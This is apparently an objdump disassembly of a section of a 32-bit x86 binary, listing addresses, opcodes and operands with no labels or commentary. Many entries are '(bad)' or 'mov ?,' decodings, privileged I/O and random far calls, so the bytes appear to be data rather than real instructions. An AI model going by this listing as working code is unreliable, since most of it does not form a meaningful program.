  41c71e:	dec    esi
  41c71f:	xor    cl,BYTE PTR [esi+0x0]
  41c722:	add    BYTE PTR [ebp-0x59b065b1],ch
  41c728:	dec    edi
  41c729:	test   eax,0xa24f934f
  41c72e:	dec    edi
  41c72f:	fwait
  41c730:	dec    edi
  41c731:	xor    cl,BYTE PTR [esi+0x0]
  41c734:	add    BYTE PTR [eax],al
  41c736:	add    BYTE PTR [eax],al
  41c738:	add    BYTE PTR [eax],al
  41c73a:	add    BYTE PTR [esi-0x71727183],cl
  41c740:	popf   
  41c741:	mov    gs,WORD PTR [ebp-0x32714272]
  41c747:	mov    ds,ebp
  41c749:	mov    gs,ebp
  41c74b:	mov    ?,ebp
  41c74d:	mov    cs,WORD PTR ds:0x2d8e1d8e
  41c753:	mov    ?,WORD PTR ds:0x6d8e5d8e
  41c759:	mov    ?,WORD PTR [edx-0x72]
  41c75c:	jae    0x41c6ec
  41c75e:	jo     0x41c6ee
  41c760:	jno    0x41c6f0
  41c762:	jbe    0x41c6f2
  41c764:	ja     0x41c6f4
  41c766:	je     0x41c6f6
  41c768:	jne    0x41c6f8
  41c76a:	mov    cl,BYTE PTR [esi-0x71777175]
  41c770:	mov    DWORD PTR [esi-0x61837172],ecx
  41c776:	jge    0x41c726
  41c778:	jge    0x41c738
  41c77a:	jge    0x41c714
  41c77c:	(bad)  
  41c77d:	jns    0x41c7f2
  41c77f:	mov    ecx,0x7d738eb1
  41c784:	ins    DWORD PTR es:[edi],dx
  41c785:	retf   0x9fc6
  41c788:	es jl  0x41c78e
  41c78b:	test   eax,0xb956bb17
  41c790:	hlt    
  41c791:	stos   BYTE PTR es:[edi],al
  41c792:	aaa    
  41c793:	stos   BYTE PTR es:[edi],al
  41c794:	jle    0x41c76f
  41c796:	jno    0x41c728
  41c798:	mov    cl,0x74
  41c79a:	push   0xffffffc8
  41c79c:	or     BYTE PTR [edi+edx*8],ah
  41c79f:	out    dx,eax
  41c7a0:	add    eax,0x9321d7b4
  41c7a5:	test   al,0x11
  41c7a7:	and    BYTE PTR [ebp+0x23],bh
  41c7aa:	fidiv  WORD PTR [edi]
  41c7ac:	leave  
  41c7ad:	mul    BYTE PTR [esi+0x1fca3d60]
  41c7b3:	xchg   esp,eax
  41c7b4:	icebp  
  41c7b5:	mov    al,ds:0x211821c6
  41c7ba:	jno    0x41c7a8
  41c7bc:	(bad)  [ebx+0x7]
  41c7bf:	cmc    
  41c7c0:	enter  0x301a,0x18
  41c7c4:	mov    al,ds:0x61540042
  41c7c9:	js     0x41c81c
  41c7cb:	mov    edi,0x230041c5
  41c7d0:	mov    BYTE PTR [ecx+0x0],0xc
  41c7d4:	in     eax,dx
  41c7d5:	adc    al,BYTE PTR [edi]
  41c7d7:	jne    0x41c853
  41c7d9:	inc    esi
  41c7da:	ja     0x41c852
  41c7dc:	dec    ebx
  41c7dd:	push   ebx
  41c7de:	inc    esi
  41c7df:	imul   edi,DWORD PTR [ecx+0x4f],0x50
  41c7e3:	dec    ebp
  41c7e4:	popa   
  41c7e5:	dec    edi
  41c7e6:	jno    0x41c850
  41c7e8:	push   edi
  41c7e9:	push   0x5167514d
  41c7ee:	inc    ecx
  41c7ef:	push   0x756c595a
  41c7f4:	push   edx
  41c7f5:	inc    ebx
  41c7f6:	popa   
  41c7f7:	jbe    0x41c84f
  41c7f9:	push   eax
  41c7fa:	imul   esi,DWORD PTR [ecx+0x57],0x7746
	...
  41c811:	add    BYTE PTR [eax],al
  41c813:	ins    BYTE PTR es:[edi],dx
  41c814:	addr16 push esi
  41c816:	jbe    0x41c86e
  41c818:	ins    BYTE PTR es:[edi],dx
  41c819:	arpl   WORD PTR [esi+0x4a],ax
  41c81c:	ja     0x41c895
  41c81e:	jns    0x41c893
  41c820:	bound  ebx,QWORD PTR [eax+0x61]
  41c823:	push   0x75
  41c825:	push   edx
  41c826:	pop    ecx
  41c827:	push   edx
  41c828:	dec    edi
  41c829:	arpl   WORD PTR [edx+0x59],bp
  41c82c:	jno    0x41c8a0
  41c82e:	arpl   WORD PTR [ebx+0x44],cx
  41c831:	jp     0x41c89d
  41c833:	bound  ecx,QWORD PTR [eax+0x41]
  41c836:	dec    esp
  41c837:	popa   
  41c838:	jb     0x41c8a3
  41c83a:	arpl   WORD PTR [ecx+0x70],di
  41c83d:	ins    BYTE PTR es:[edi],dx
  41c83e:	fs pop edx
  41c840:	inc    ebx
  41c841:	push   edi
  41c842:	arpl   WORD PTR [eax],ax
  41c844:	add    BYTE PTR [edi+0x76],ch
  41c847:	jbe    0x41c8bf
  41c849:	pop    edx
  41c84a:	jae    0x41c89b
  41c84c:	dec    edi
  41c84d:	popa   
  41c84e:	inc    ebp
  41c84f:	jae    0x41c8c1
  41c851:	add    BYTE PTR [eax],al
  41c853:	push   ebx
  41c854:	jns    0x41c899
  41c856:	ins    BYTE PTR es:[edi],dx
  41c857:	outs   dx,BYTE PTR ds:[esi]
  41c858:	push   ebx
  41c859:	push   ebp
  41c85a:	push   esi
  41c85b:	bound  ecx,QWORD PTR [eax+0x7a]
  41c85e:	dec    edx
  41c85f:	add    BYTE PTR [eax],al
  41c861:	imul   edx,DWORD PTR [edx+0x68],0x72
  41c865:	push   edi
  41c866:	dec    eax
  41c867:	jb     0x41c8b6
  41c869:	jne    0x41c8df
  41c86b:	push   0x4d
  41c86d:	add    BYTE PTR [eax],al
  41c86f:	pop    ecx
  41c870:	push   edx
  41c871:	dec    ebp
  41c872:	inc    esi
  41c873:	jns    0x41c8ea
  41c875:	dec    edx
  41c876:	dec    esi
  41c877:	push   ebx
  41c878:	push   ebp
  41c879:	dec    ebp
  41c87a:	push   ecx
  41c87b:	dec    ebp
  41c87c:	add    BYTE PTR [ecx+0x6d],ch
  41c87f:	inc    esi
  41c880:	ins    BYTE PTR es:[edi],dx
  41c881:	arpl   WORD PTR [esi+0x43],ax
  41c884:	inc    ecx
  41c885:	pop    eax
  41c886:	dec    edx
  41c887:	dec    eax
  41c888:	push   esi
  41c889:	push   ebx
  41c88a:	jo     0x41c8f2
  41c88c:	add    BYTE PTR [ebx+0x45],ch
  41c88f:	jns    0x41c905
  41c891:	inc    edx
  41c892:	dec    esp
  41c893:	dec    edi
  41c894:	jp     0x41c905
  41c896:	inc    ebx
  41c897:	add    BYTE PTR [eax],al
  41c899:	inc    ecx
  41c89a:	dec    esi
  41c89b:	jae    0x41c904
  41c89d:	push   ebp
  41c89e:	push   0x44514f55
	...
  41c8ab:	imul   edx,DWORD PTR [eax+0x74],0x72
  41c8af:	jbe    0x41c903
  41c8b1:	dec    ebx
  41c8b2:	data16 jbe 0x41c904
  41c8b5:	popa   
  41c8b6:	push   edx
  41c8b7:	fs pop ecx
  41c8b9:	push   ebp
  41c8ba:	dec    esi
  41c8bb:	outs   dx,BYTE PTR ds:[esi]
  41c8bc:	jns    0x41c932
  41c8be:	push   0x4d
  41c8c0:	dec    ebp
  41c8c1:	dec    esi
  41c8c2:	pop    edx
  41c8c3:	dec    ebx
  41c8c4:	dec    edx
  41c8c5:	ins    BYTE PTR es:[di],dx
  41c8c7:	jbe    0x41c921
  41c8c9:	push   ebx
  41c8ca:	outs   dx,DWORD PTR ds:[esi]
  41c8cb:	popa   
  41c8cc:	dec    ebp
  41c8cd:	push   ebp
  41c8ce:	je     0x41c928
  41c8d0:	ja     0x41c94c
  41c8d2:	push   ecx
  41c8d3:	jo     0x41c92b
  41c8d5:	inc    ebx
  41c8d6:	jne    0x41c93c
  41c8d8:	jae    0x41c93e
  41c8da:	dec    edx
  41c8db:	push   esi
  41c8dc:	inc    edi
  41c8dd:	dec    eax
  41c8de:	inc    ecx
  41c8df:	jp     0x41c931
  41c8e1:	dec    edx
  41c8e2:	inc    esi
  41c8e3:	imul   esp,DWORD PTR fs:[ecx+edi*2+0x49],0x666d7856
  41c8ec:	jns    0x41c957
  41c8ee:	imul   ecx,DWORD PTR [esi+0x74],0x42
  41c8f2:	push   edi
  41c8f3:	push   ebx
  41c8f4:	push   0x6d
  41c8f6:	arpl   WORD PTR [esi+0x78],ax
  41c8f9:	ins    BYTE PTR es:[edi],dx
  41c8fa:	data16 jb 0x41c940
  41c8fd:	jae    0x41c94f
  41c8ff:	push   esp
  41c900:	push   ebx
  41c901:	push   ebp
  41c902:	fs jne 0x41c976
  41c905:	imul   eax,DWORD PTR [edx+0x41],0x49
  41c909:	dec    esi
  41c90a:	push   ebp
  41c90b:	dec    esi
  41c90c:	ja     0x41c984
  41c90e:	pop    ecx
  41c90f:	dec    edi
  41c910:	jae    0x41c98a
  41c912:	inc    edx
  41c913:	jbe    0x41c976
  41c915:	push   edx
  41c916:	jo     0x41c97f
  41c918:	or     BYTE PTR [ecx],dh
  41c91a:	mov    esp,0xdbefbd7f
  41c91f:	scas   al,BYTE PTR es:[edi]
  41c920:	push   ss
  41c921:	push   ecx
  41c922:	sbb    eax,DWORD PTR [ecx]
  41c924:	and    edi,DWORD PTR [ebx]
  41c926:	pop    es
  41c927:	loopne 0x41c8c0
  41c929:	add    DWORD PTR [eax],eax
  41c92b:	sub    eax,DWORD PTR [edx]
  41c92d:	add    BYTE PTR [eax],al
  41c92f:	retf   
  41c930:	nop
  41c931:	fild   DWORD PTR [edi]
  41c933:	pop    esi
  41c934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c935:	dec    edi
  41c936:	lods   al,BYTE PTR ds:[esi]
  41c937:	sar    DWORD PTR [eax+0x765831a0],1
  41c93d:	adc    eax,0xfe26cdb7
  41c942:	xchg   ecx,eax
  41c943:	fbld   TBYTE PTR [edx+0x69]
  41c946:	retf   
  41c947:	add    ebp,DWORD PTR [eax+0x5ec96c51]
  41c94d:	xchg   dl,cl
  41c94f:	lea    ecx,[esi+ecx*2]
  41c952:	call   DWORD PTR [eax-0x17]
  41c955:	inc    eax
  41c956:	pop    es
  41c957:	sub    al,BYTE PTR [ebp+0x6f]
  41c95a:	outs   dx,BYTE PTR ds:[esi]
  41c95b:	aad    0x88
  41c95d:	in     eax,dx
  41c95e:	jp     0x41c8f6
  41c960:	sub    BYTE PTR [esi],0xa6
  41c963:	xor    DWORD PTR [ecx+eax*1-0x7d],0x3e13fc80
  41c96b:	jg     0x41c947
  41c96d:	int3   
  41c96e:	inc    ecx
  41c96f:	retf   
  41c970:	aam    0x6d
  41c972:	and    al,0x87
  41c974:	or     esi,DWORD PTR [ebx+ebp*2+0x301bd4f1]
  41c97b:	iret   
  41c97c:	xor    al,0xa9
  41c97e:	dec    edx
  41c97f:	pop    ebp
  41c980:	mov    al,0xae
  41c982:	push   cs
  41c983:	xchg   edi,eax
  41c984:	icebp  
  41c985:	clc    
  41c986:	jp     0x41c915
  41c988:	pop    ebp
  41c989:	inc    ebp
  41c98a:	jo     0x41c937
  41c98c:	bound  ecx,QWORD PTR [esi-0x57]
  41c98f:	ror    ebx,cl
  41c991:	mov    ds:0xfceb5e4f,eax
  41c996:	xchg   DWORD PTR [ebx+0x247e1882],ecx
  41c99c:	sub    ebx,DWORD PTR [edi]
  41c99e:	cmp    BYTE PTR [ebp-0x1d7f4856],al
  41c9a4:	inc    ebx
  41c9a5:	cmc    
  41c9a6:	cli    
  41c9a7:	lock fdivr QWORD PTR [edx-0x4b2f6735]
  41c9ae:	adc    BYTE PTR [edx],dh
  41c9b0:	js     0x41c953
  41c9b2:	sar    BYTE PTR [ebx+0x42],1
  41c9b5:	sbb    edx,DWORD PTR [eax]
  41c9b7:	icebp  
  41c9b8:	test   al,0xa4
  41c9ba:	test   al,0xc2
  41c9bc:	aad    0x62
  41c9be:	imul   esi,DWORD PTR [edi],0xffffff9e
  41c9c1:	dec    esi
  41c9c2:	add    edi,DWORD PTR [eax+ebp*4]
  41c9c5:	mov    edx,0xe49fcbc2
  41c9ca:	repnz scas eax,DWORD PTR es:[edi]
  41c9cc:	outs   dx,DWORD PTR ds:[esi]
  41c9cd:	mov    ah,0xb2
  41c9cf:	sub    edx,DWORD PTR [esi-0x328b7ff9]
  41c9d5:	leave  
  41c9d6:	mov    ebx,0x2be19f6f
  41c9db:	cmp    eax,0x10e40670
  41c9e0:	and    ebx,DWORD PTR [ebx+0x58ec6296]
  41c9e6:	adc    al,0x18
  41c9e8:	cwde   
  41c9e9:	add    ch,BYTE PTR [esp+eax*8+0x4b]
  41c9ed:	sbb    al,0x65
  41c9ef:	pop    ds
  41c9f0:	test   eax,0x6b545c63
  41c9f5:	neg    DWORD PTR [edi+0x200a0c0e]
  41c9fb:	add    BYTE PTR ds:0xe0dd2931,bh
  41ca01:	pop    esp
  41ca02:	call   0x1ccf6e20
  41ca07:	call   0x7834:0xc49cd3e6
  41ca0e:	xchg   ebx,eax
  41ca0f:	sub    ecx,edx
  41ca11:	xchg   esi,eax
  41ca12:	das    
  41ca13:	and    eax,0xd9640981
  41ca18:	cmp    BYTE PTR [ebx],dh
  41ca1a:	adc    al,0x62
  41ca1c:	mov    dl,0xc3
  41ca1e:	jne    0x41ca72
  41ca20:	or     ah,BYTE PTR [esi+0x53]
  41ca23:	lods   eax,DWORD PTR ds:[esi]
  41ca24:	dec    ebp
  41ca25:	enter  0x921d,0xf0
  41ca29:	xchg   esp,eax
  41ca2a:	pop    edi
  41ca2b:	int3   
  41ca2c:	retf   0x5525
  41ca2f:	jo     0x41ca40
  41ca31:	dec    ebp
  41ca32:	adc    ebp,DWORD PTR [edx]
  41ca34:	xchg   ebp,eax
  41ca35:	mov    bh,0x31
  41ca37:	pushf  
  41ca38:	int3   
  41ca39:	jp     0x41ca51
  41ca3b:	loop   0x41c9ff
  41ca3d:	fiadd  DWORD PTR [ebp+0x7]
  41ca40:	rcl    DWORD PTR es:[esi+0x3d64dd28],1
  41ca47:	add    bl,cl
  41ca49:	into   
  41ca4a:	test   esp,0x4bd54a5b
  41ca50:	sbb    DWORD PTR [ebp+0x54055d4c],ebp
  41ca56:	or     cl,BYTE PTR [esi-0x48]
  41ca59:	dec    edx
  41ca5a:	imul   ebp
  41ca5c:	in     eax,dx
  41ca5d:	mov    ecx,0x9f1d7134
  41ca62:	dec    ecx
  41ca63:	test   al,0xb0
  41ca65:	mov    cl,0x46
  41ca67:	test   BYTE PTR [eax+edx*2-0x42],bh
  41ca6b:	cdq    
  41ca6c:	sub    DWORD PTR [ecx],esi
  41ca6e:	or     DWORD PTR [edi],eax
  41ca70:	out    0xd6,eax
  41ca72:	push   0x8e68aee9
  41ca77:	inc    edi
  41ca78:	inc    esi
  41ca79:	pop    edx
  41ca7a:	fisubr WORD PTR [esp+esi*1+0x2e]
  41ca7e:	adc    al,0x44
  41ca80:	std    
  41ca81:	pop    eax
  41ca82:	(bad)  
  41ca84:	mov    esi,0x5c7a0d5f
  41ca89:	jae    0x41caed
  41ca8b:	out    dx,al
  41ca8c:	je     0x41ca4e
  41ca8e:	out    dx,eax
  41ca8f:	xchg   ecx,eax
  41ca90:	push   esp
  41ca91:	cmp    DWORD PTR [ebp-0xc327511],edi
  41ca97:	sub    eax,0x312d40fb
  41ca9c:	fidivr WORD PTR [ecx+esi*2-0x56540ecd]
  41caa3:	mov    ch,cl
  41caa5:	data16 in al,dx
  41caa7:	mov    cl,0x4b
  41caa9:	push   edx
  41caaa:	repnz dec ecx
  41caac:	mov    bl,0xc
  41caae:	ss aaa 
  41cab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cab1:	outs   dx,BYTE PTR ds:[esi]
  41cab2:	fsubr  DWORD PTR [edi+0x23054ec2]
  41cab8:	les    eax,FWORD PTR [eax]
  41caba:	div    BYTE PTR [ebp+0x1f63fcd3]
  41cac0:	dec    ecx
  41cac1:	mov    dh,0xd9
  41cac3:	jmp    0xbce6f4f4
  41cac8:	jno    0x41cacb
  41caca:	mov    ah,0x71
  41cacc:	xchg   ebx,eax
  41cacd:	pop    ebx
  41cace:	xchg   edi,eax
  41cacf:	add    ebx,ecx
  41cad1:	adc    DWORD PTR [eax-0x7b76c41a],0xc43fc445
  41cadb:	jae    0x41cac9
  41cadd:	shr    DWORD PTR [esi],cl
  41cadf:	mov    al,0x79
  41cae1:	into   
  41cae2:	repnz xchg edi,eax
  41cae4:	or     ch,BYTE PTR [ecx+0x23]
  41cae7:	je     0x41ca70
  41cae9:	xchg   edx,eax
  41caea:	jle    0x41ca99
  41caec:	bound  eax,QWORD PTR [ebp-0x719ea201]
  41caf2:	mov    cl,0xdc
  41caf4:	out    dx,al
  41caf5:	push   ds
  41caf6:	das    
  41caf7:	lahf   
  41caf8:	sub    BYTE PTR [esi-0xf],dh
  41cafb:	aad    0x9d
  41cafd:	push   esi
  41cafe:	pop    ecx
  41caff:	fsub   DWORD PTR [eax]
  41cb01:	ret    0xda81
  41cb04:	sbb    bh,dh
  41cb06:	popf   
  41cb07:	popa   
  41cb08:	sbb    ebx,esp
  41cb0a:	or     BYTE PTR [eax],bh
  41cb0c:	sbb    eax,0x9cfd48a8
  41cb11:	bnd ja 0x41cabf
  41cb14:	ror    DWORD PTR [ebx],cl
  41cb16:	outs   dx,DWORD PTR ds:[esi]
  41cb17:	inc    esp
  41cb18:	lock imul eax,edi,0x3727c327
  41cb1f:	outs   dx,BYTE PTR ds:[esi]
  41cb20:	rcl    BYTE PTR [ecx],1
  41cb22:	push   0xe
  41cb24:	sub    eax,0x60c2f889
  41cb29:	mov    BYTE PTR [ebx-0x385d06ef],bh
  41cb2f:	sbb    al,0xd0
  41cb31:	push   edi
  41cb32:	mov    ds:0x7ff191a4,al
  41cb37:	adc    BYTE PTR [esi],bl
  41cb39:	cld    
  41cb3a:	push   cs
  41cb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb3c:	pushf  
  41cb3d:	push   edi
  41cb3e:	push   0x2e0c4077
  41cb43:	xchg   bh,bh
  41cb45:	sti    
  41cb46:	fld    QWORD PTR [ebx]
  41cb48:	in     eax,dx
  41cb49:	ins    BYTE PTR es:[edi],dx
  41cb4a:	inc    edx
  41cb4b:	fidivr WORD PTR [ebp+esi*8-0x26b26ef1]
  41cb52:	sbb    ebx,DWORD PTR [ecx]
  41cb54:	add    ebx,DWORD PTR [ecx-0x1998db61]
	...
  41cb66:	add    BYTE PTR [ebp-0x287b78a3],cl
  41cb6c:	fimul  WORD PTR [edi+0x63b71d5d]
  41cb72:	xor    BYTE PTR [ecx+0xb07f518],bl
  41cb78:	call   0x0:0x22b0001
  41cb7f:	fxch   st(6)
  41cb81:	(bad)  
  41cb82:	loope  0x41cbf2
  41cb84:	addr16 dec esp
  41cb86:	inc    ecx
  41cb87:	mov    al,0xa6
  41cb89:	and    al,0x1b
  41cb8b:	xchg   esp,eax
  41cb8c:	retf   0xf55f
  41cb8f:	scas   ax,WORD PTR es:[edi]
  41cb91:	mov    ds:0xb496c5b7,al
  41cb96:	sub    DWORD PTR [edi-0x6f],esi
  41cb99:	sub    dl,BYTE PTR [ebp+esi*8+0x65]
  41cb9d:	(bad)  
  41cb9e:	and    cl,BYTE PTR [ecx-0x1f96ce64]
  41cba4:	(bad)  
  41cba5:	lods   eax,DWORD PTR ds:[esi]
  41cba6:	(bad)  
  41cba7:	cli    
  41cba8:	js     0x41cb49
  41cbaa:	pop    edi
  41cbab:	shr    edi,cl
  41cbad:	xor    BYTE PTR [eax+0x10],ah
  41cbb0:	test   eax,0xa4bf19bf
  41cbb5:	inc    ebx
  41cbb6:	addr16 jns 0x41cbf1
  41cbb9:	in     eax,0x44
  41cbbb:	cmp    al,0xd2
  41cbbd:	test   BYTE PTR [eax+esi*2-0x27],ch
  41cbc1:	aad    0xe5
  41cbc3:	mov    esi,esi
  41cbc5:	mov    edx,0x670dcc87
  41cbca:	adc    BYTE PTR [ecx],0x98
  41cbcd:	sub    BYTE PTR [ecx+ebx*2-0x2a8584b9],cl
  41cbd4:	mov    ebp,0x33726f7d
  41cbd9:	pushf  
  41cbda:	push   ds
  41cbdb:	pop    esi
  41cbdc:	int    0x58
  41cbde:	sbb    DWORD PTR [ebp-0x3adba018],0x5e
  41cbe5:	inc    ebp
  41cbe6:	ror    BYTE PTR ss:[edi],0xdb
  41cbea:	(bad)  
  41cbeb:	mov    esi,0x822040b2
  41cbf0:	add    dh,BYTE PTR [edx]
  41cbf2:	or     al,0x3b
  41cbf4:	leave  
  41cbf5:	and    ah,BYTE PTR [eax+0x39]
  41cbf8:	adc    bh,BYTE PTR [edi+ebp*2+0x55]
  41cbfc:	shl    BYTE PTR [ebx],cl
  41cbfe:	(bad)  
  41cc00:	xor    BYTE PTR [ecx-0x76],0x8c
  41cc04:	sti    
  41cc05:	and    BYTE PTR [esi+0x35],ah
  41cc08:	in     al,0x5b
  41cc0a:	in     al,dx
  41cc0b:	sub    al,0x2c
  41cc0d:	inc    esp
  41cc0e:	dec    esp
  41cc0f:	stos   DWORD PTR es:[edi],eax
  41cc10:	sub    ebx,DWORD PTR [edx-0xe49c103]
  41cc16:	xor    DWORD PTR [esp+esi*2-0x3010751],eax
  41cc1d:	mov    ebx,0x55954aa
  41cc22:	test   BYTE PTR [ebp+0x0],dh
  41cc25:	or     al,0x35
  41cc27:	xor    esp,DWORD PTR [eax]
  41cc29:	mov    DWORD PTR [ebp-0x26],0xc5481b65
  41cc30:	sub    cl,BYTE PTR [esi-0x5b]
  41cc33:	sub    eax,0x6e8ed74d
  41cc38:	pop    esp
  41cc39:	retf   
  41cc3a:	push   esp
  41cc3b:	or     ecx,DWORD PTR [ebp-0x4e]
  41cc3e:	sbb    cl,BYTE PTR [esi*4+0x471d4cc0]
  41cc45:	aad    0xd0
  41cc47:	scas   al,BYTE PTR es:[edi]
  41cc48:	push   ebp
  41cc49:	sbb    DWORD PTR [ecx],edx
  41cc4b:	mov    dl,0xb0
  41cc4d:	or     al,0xc1
  41cc4f:	das    
  41cc50:	xchg   bl,bh
  41cc52:	dec    ebx
  41cc53:	jo     0x41ccd1
  41cc55:	push   0x76
  41cc57:	in     al,dx
  41cc58:	sbb    ebp,DWORD PTR [ecx]
  41cc5a:	mov    esp,0x8153797f
  41cc5f:	cdq    
  41cc60:	push   cs
  41cc61:	sar    DWORD PTR [eax-0x441b7d2],0xe0
  41cc68:	je     0x41cc82
  41cc6a:	mov    al,ds:0xac1e9761
  41cc6f:	cmp    bl,BYTE PTR [eax+0x4f58f8b]
  41cc75:	fst    DWORD PTR ds:0x4388b770
  41cc7b:	mov    edx,ebp
  41cc7d:	pop    edx
  41cc7e:	xchg   BYTE PTR [edi],dh
  41cc80:	adc    bh,BYTE PTR [ebx]
  41cc82:	sub    BYTE PTR [ebx-0x3eea6a67],dl
  41cc88:	push   ss
  41cc89:	dec    ecx
  41cc8a:	jmp    DWORD PTR [esi]
  41cc8c:	mov    bh,0x59
  41cc8e:	pop    ds
  41cc8f:	test   eax,0x1c2cd32
  41cc94:	or     ebx,DWORD PTR [edx-0x11]
  41cc97:	mov    DWORD PTR ds:0x548eedb1,0xca15ab2
  41cca1:	cs pop edi
  41cca3:	scas   eax,DWORD PTR es:[edi]
  41cca4:	push   ebp
  41cca5:	mov    esi,0x8258d933
  41ccaa:	push   esp
  41ccab:	jb     0x41cc4c
  41ccad:	sahf   
  41ccae:	xchg   esp,eax
  41ccaf:	popf   
  41ccb0:	aas    
  41ccb1:	rol    BYTE PTR [ecx-0x18d093fe],cl
  41ccb7:	jns    0x41cd32
  41ccb9:	sbb    ecx,DWORD PTR [ecx+0x6f]
  41ccbc:	pop    edx
  41ccbd:	call   0x5b6a7488
  41ccc2:	pop    ds
  41ccc3:	leave  
  41ccc4:	and    BYTE PTR [edi],dl
  41ccc6:	jge    0x41ccda
  41ccc8:	mov    DWORD PTR [esi+edi*2-0x65],edi
  41cccc:	add    al,0x31
  41ccce:	jno    0x41cc52
  41ccd0:	push   0x47
  41ccd2:	(bad)  
  41ccd4:	sahf   
  41ccd5:	enter  0x9875,0x4a
  41ccd9:	lahf   
  41ccda:	push   0xfffffff2
  41ccdc:	in     eax,dx
  41ccdd:	mov    BYTE PTR [edi],dh
  41ccdf:	test   ch,cl
  41cce1:	mov    ebx,0x1e119318
  41cce6:	dec    esi
  41cce7:	sbb    BYTE PTR [ecx],0xcc
  41ccea:	stos   DWORD PTR es:[edi],eax
  41cceb:	fwait
  41ccec:	jecxz  0x41cd5f
  41ccee:	js     0x41ccd5
  41ccf0:	fadd   DWORD PTR [ebx+0xe21c3b0]
  41ccf6:	retf   0x2bb6
  41ccf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccfa:	inc    esp
  41ccfb:	shl    BYTE PTR [edx-0x2f],1
  41ccfe:	rcr    ecx,1
  41cd00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd01:	jge    0x41cc89
  41cd03:	sub    al,0xa1
  41cd05:	push   0xe9677cb8
  41cd0a:	xor    esi,DWORD PTR [edx+0x253c5076]
  41cd10:	push   ds
  41cd11:	inc    ebp
  41cd12:	jnp    0x41cca9
  41cd14:	jae    0x41ccda
  41cd16:	push   cs
  41cd17:	cld    
  41cd18:	push   ss
  41cd19:	stos   BYTE PTR es:[edi],al
  41cd1a:	repz (bad) 
  41cd1c:	repz mov al,ds:0x1e2cb71f
  41cd22:	call   0x4f6c:0xbaf42d2b
  41cd29:	push   edx
  41cd2a:	loop   0x41cd95
  41cd2c:	xor    DWORD PTR [ecx-0x64],ebx
  41cd2f:	or     al,0xb3
  41cd31:	fdivr  st,st(0)
  41cd33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd34:	clc    
  41cd35:	into   
  41cd36:	cwde   
  41cd37:	sub    eax,0x8b36aabd
  41cd3c:	es test ebx,edi
  41cd3f:	cmp    DWORD PTR ds:[ecx+0x26],edi
  41cd43:	cmp    DWORD PTR [eax],0xffffffab
  41cd46:	mov    al,ds:0x4fef7e61
  41cd4b:	loop   0x41cd04
  41cd4d:	popa   
  41cd4e:	sub    BYTE PTR [esi+0x14],0x89
  41cd52:	ret    
  41cd53:	ret    
  41cd54:	adc    cl,BYTE PTR [edi+0x7b]
  41cd57:	or     bh,dl
  41cd59:	or     BYTE PTR [ecx-0x4a8ce500],0xd7
  41cd60:	mov    ?,WORD PTR [edx-0x28bf238a]
  41cd66:	add    edi,ebp
  41cd68:	aam    0xcc
  41cd6a:	jmp    0x41cd6b
  41cd6c:	retf   0x934a
  41cd6f:	adc    DWORD PTR [ebx-0x2f],ecx
  41cd72:	push   ds
  41cd73:	sub    bl,BYTE PTR [esp+eax*8-0x2cc45c8a]
  41cd7a:	dec    eax
  41cd7b:	mov    BYTE PTR [edx+0x33da28d3],al
  41cd81:	stos   BYTE PTR es:[edi],al
  41cd82:	xchg   ebx,eax
  41cd83:	and    BYTE PTR [edx],cl
  41cd85:	mov    edi,ebx
  41cd87:	shl    ebp,0x6c
  41cd8a:	cmp    ebp,DWORD PTR [edx]
  41cd8c:	sar    DWORD PTR [edi+edx*8+0x24],cl
  41cd90:	jl     0x41cdd3
  41cd92:	(bad)  
  41cd93:	jl     0x41cde3
  41cd95:	xchg   ebx,eax
  41cd96:	cmp    esi,DWORD PTR [ecx+0x33e3d96b]
  41cd9c:	xchg   esi,eax
  41cd9d:	mov    esi,0x67bd2d43
  41cda2:	mov    eax,0x2cf5e2b2
  41cda7:	mov    ds:0x4f1e,al
	...
  41cdb4:	add    BYTE PTR [eax],al
  41cdb6:	add    BYTE PTR [ebp+0x3e],bl
  41cdb9:	jl     0x41cd45
  41cdbb:	jg     0x41cd87
  41cdbd:	(bad)  
  41cdbe:	jmp    FWORD PTR [ebp+0x7e52a523]
  41cdc4:	xchg   esp,eax
  41cdc5:	dec    esp
  41cdc6:	jp     0x41cdfe
  41cdc8:	pushf  
  41cdc9:	add    DWORD PTR [eax],eax
  41cdcb:	sub    eax,DWORD PTR [edx]
  41cdcd:	add    BYTE PTR [eax],al
  41cdcf:	cmc    
  41cdd0:	jmp    0x41cd88
  41cdd2:	in     al,dx
  41cdd3:	mov    eax,ds:0xf2a49635
  41cdd8:	data16 sti 
  41cdda:	lock mov esp,0xea6c11cf
  41cde0:	cdq    
  41cde1:	std    
  41cde2:	adc    edi,ebx
  41cde4:	or     al,0xcf
  41cde6:	(bad)  
  41cde7:	leave  
  41cde8:	es repnz in eax,dx
  41cdeb:	test   al,0xbc
  41cded:	push   esp
  41cdee:	lods   al,BYTE PTR ds:[esi]
  41cdef:	add    eax,0x1a92552d
  41cdf4:	inc    edx
  41cdf5:	ss repz jge 0x41cdb7
  41cdf9:	out    dx,al
  41cdfa:	rcl    dh,1
  41cdfc:	in     eax,0x5f
  41cdfe:	cdq    
  41cdff:	jp     0x41ce73
  41ce01:	cwde   
  41ce02:	in     al,dx
  41ce03:	das    
  41ce04:	xchg   esi,eax
  41ce05:	xchg   ecx,eax
  41ce06:	cld    
  41ce07:	in     al,0x44
  41ce09:	(bad)  [ecx-0x5aec7f92]
  41ce0f:	cmp    cl,al
  41ce11:	xlat   BYTE PTR ds:[ebx]
  41ce12:	stc    
  41ce13:	mov    ds:0xe76d2246,eax
  41ce18:	mov    ebp,0xe8178537
  41ce1d:	(bad)  
  41ce1e:	test   BYTE PTR [ebp+0x4cfcef56],bh
  41ce24:	xor    BYTE PTR [esi],ch
  41ce26:	mov    ecx,0x73b4172a
  41ce2b:	jge    0x41cdf2
  41ce2d:	retf   0xeb27
  41ce30:	mov    cl,0x79
  41ce32:	(bad)  
  41ce33:	or     dl,bl
  41ce35:	test   al,0xe7
  41ce37:	or     DWORD PTR [ebx+0x79],ebp
  41ce3a:	add    edi,eax
  41ce3c:	sahf   
  41ce3d:	push   esi
  41ce3e:	repnz dec eax
  41ce40:	jg     0x41ce33
  41ce42:	fdivr  DWORD PTR [ecx+esi*2-0x13a0c538]
  41ce49:	(bad)  
  41ce4a:	or     dl,BYTE PTR [eax-0x36]
